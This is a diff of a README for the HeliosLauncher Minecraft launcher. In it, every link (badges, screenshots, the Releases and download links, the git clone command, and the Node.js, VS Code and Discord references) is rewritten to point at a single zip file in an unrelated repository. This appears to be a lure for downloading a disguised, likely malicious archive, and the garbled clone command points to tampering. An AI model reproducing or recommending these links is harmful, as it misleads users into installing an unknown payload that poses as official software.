@@ -4,12 +4,12 @@
 
 <em><h5 align="center">(formerly Electron Launcher)</h5></em>
 
-[<p align="center"><img src="https://img.shields.io/travis/dscalzi/HeliosLauncher.svg?style=for-the-badge" alt="travis">](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip) [<img src="https://img.shields.io/github/downloads/dscalzi/HeliosLauncher/total.svg?style=for-the-badge" alt="downloads">](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip) <img src="https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip"  height="28px" alt="stark"></p>
+[<p align="center"><img src="https://img.shields.io/travis/dscalzi/HeliosLauncher.svg?style=for-the-badge" alt="travis">](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip) [<img src="https://img.shields.io/github/downloads/dscalzi/HeliosLauncher/total.svg?style=for-the-badge" alt="downloads">](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip) <img src="https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip"  height="28px" alt="stark"></p>
 
 <p align="center">Join modded servers without worrying about installing Java, Forge, or other mods. We'll handle that for you.</p>
 
-![Screenshot 1](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip)
-![Screenshot 2](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip)
+![Screenshot 1](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip)
+![Screenshot 2](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip)
 
 ## Features
 
@@ -38,18 +38,18 @@ This is not an exhaustive list. Download and install the launcher to gauge all i
 
 ## Downloads
 
-You can download from [GitHub Releases](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip)
+You can download from [GitHub Releases](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip)
 
 #### Latest Release
 
-[![](https://img.shields.io/github/release/dscalzi/HeliosLauncher.svg?style=flat-square)](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip)
+[![](https://img.shields.io/github/release/dscalzi/HeliosLauncher.svg?style=flat-square)](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip)
 
 #### Latest Pre-Release
-[![](https://img.shields.io/github/release/dscalzi/HeliosLauncher/all.svg?style=flat-square)](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip)
+[![](https://img.shields.io/github/release/dscalzi/HeliosLauncher/all.svg?style=flat-square)](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip)
 
 **Supported Platforms**
 
-If you download from the [Releases](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip) tab, select the installer for your system.
+If you download from the [Releases](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip) tab, select the installer for your system.
 
 | Platform | File |
 | -------- | ---- |
@@ -71,7 +71,7 @@ Ensure that you have the console tab selected. Do not paste anything into the co
 
 If you want to export the console output, simply right click anywhere on the console and click **Save as..**
 
-![console example](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip)
+![console example](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip)
 
 
 ## Development
@@ -89,7 +89,7 @@ This section details the setup of a basic developmentment environment.
 **Clone and Install Dependencies**
 
 ```console
-> git clone https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip
+> git clone https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip
 > cd HeliosLauncher
 > npm install
 ```
@@ -196,19 +196,19 @@ We reserve the right to update these conditions at any time, please check back p
 
 The best way to contact the developers is on Discord.
 
-[![discord](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip)][discord]
+[![discord](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip)][discord]
 
 ---
 
 ### See you ingame.
 
 
-[nodejs]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip 'Node.js'
-[vscode]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip 'Visual Studio Code'
-[mainprocess]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip 'Main Process'
-[rendererprocess]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip 'Renderer Process'
-[chromedebugger]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip 'Debugger for Chrome'
-[discord]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip 'Discord'
-[wiki]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip 'wiki'
-[nebula]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip 'dscalzi/Nebula'
-[v2branch]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/libraries/java/Evonia-Z-1.8.zip 'v2 branch'
+[nodejs]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip 'Node.js'
+[vscode]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip 'Visual Studio Code'
+[mainprocess]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip 'Main Process'
+[rendererprocess]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip 'Renderer Process'
+[chromedebugger]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip 'Debugger for Chrome'
+[discord]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip 'Discord'
+[wiki]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip 'wiki'
+[nebula]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip 'dscalzi/Nebula'
+[v2branch]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip 'v2 branch'
